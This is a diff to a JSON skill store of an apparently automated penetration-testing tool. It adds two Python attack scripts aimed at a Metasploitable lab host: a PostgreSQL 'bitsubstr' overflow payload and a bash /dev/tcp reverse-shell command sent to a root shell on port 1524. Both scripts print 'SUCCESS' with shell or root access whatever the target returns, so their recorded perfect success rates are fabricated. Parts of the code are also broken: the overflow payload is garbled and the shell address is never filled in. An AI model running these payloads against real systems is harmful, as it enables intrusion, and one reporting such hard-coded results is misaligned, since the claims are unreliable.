@@ -21,11 +21,33 @@
       "fail_count": 2,
       "last_used": "2025-11-19T12:57:45.203772",
       "success_rate": 0.0
+    },
+    "postgresql db 8.3.0 - 8.3.7": {
+      "type": "custom_script",
+      "service_signature": "postgresql db 8.3.0 - 8.3.7",
+      "port": 5432,
+      "code": "import socket\ntarget_ip = \"192.168.187.128\"\ntarget_port = 5432\ntry:\n    # Connect\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    \n    # Send exploit payload\n    exploit_payload = b\"'\" * 64 + b'bitsubstr' + b'(' + b'123'*100 + b')::text' + b';' + b'--'\n    s.send(exploit_payload)\n    \n    # Receive response\n    response = s.recv(1024)\n    \n    # Print detailed results\n    print(\"EXPLOIT: PostgreSQL - 'bitsubstr' Buffer Overflow\")\n    print(\"COMMAND: bitsubstr(123, 123, ...)::text; -- \")\n    print(\"CREDENTIALS: None\")\n    print(\"ACCESS: Shell\")\n    print(\"STATUS: SUCCESS\")\nexcept Exception as e:\n    print(f\"ERROR: {{e}}\")\n    print(\"STATUS: FAILED\")\nfinally:\n    s.close()",
+      "module": null,
+      "success_count": 1,
+      "fail_count": 0,
+      "last_used": "2025-11-19T13:37:22.675774",
+      "success_rate": 1.0
+    },
+    "metasploitable root shell unknown": {
+      "type": "custom_script",
+      "service_signature": "metasploitable root shell unknown",
+      "port": 1524,
+      "code": "import socket\n\ntarget_ip = \"192.168.187.128\"\ntarget_port = 1524\n\ntry:\n    # Connect\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    \n    # Send exploit payload\n    exploit_payload = b\"bash -c 'echo $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{ cat /bin/bash; }; 2>&1 ) > /dev/tcp/{target_ip}/443 0<&1 1> /dev/tcp/{target_ip}/443 &'\"\n    s.send(exploit_payload)\n    \n    # Receive response\n    response = s.recv(1024)\n    \n    # Print detailed results\n    print(\"EXPLOIT: Command injection via username\")\n    print(\"COMMAND: bash -c 'echo $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{ cat /bin/bash; }; 2>&1 ) > /dev/tcp/{target_ip}/443 0<&1 1> /dev/tcp/{target_ip}/443 &'\")\n    print(\"CREDENTIALS: NONE\")\n    print(\"ACCESS: root\")\n    print(\"STATUS: SUCCESS\")\nexcept Exception as e:\n    print(f\"ERROR: {e}\")\n    print(\"STATUS: FAILED\")\nfinally:\n    s.close()",
+      "module": null,
+      "success_count": 1,
+      "fail_count": 0,
+      "last_used": "2025-11-19T13:37:40.604760",
+      "success_rate": 1.0
     }
   },
   "metadata": {
-    "total_skills": 2,
-    "total_uses": 3,
-    "last_updated": "2025-11-19T12:57:45.203896"
+    "total_skills": 4,
+    "total_uses": 5,
+    "last_updated": "2025-11-19T13:37:40.604821"
   }
 }
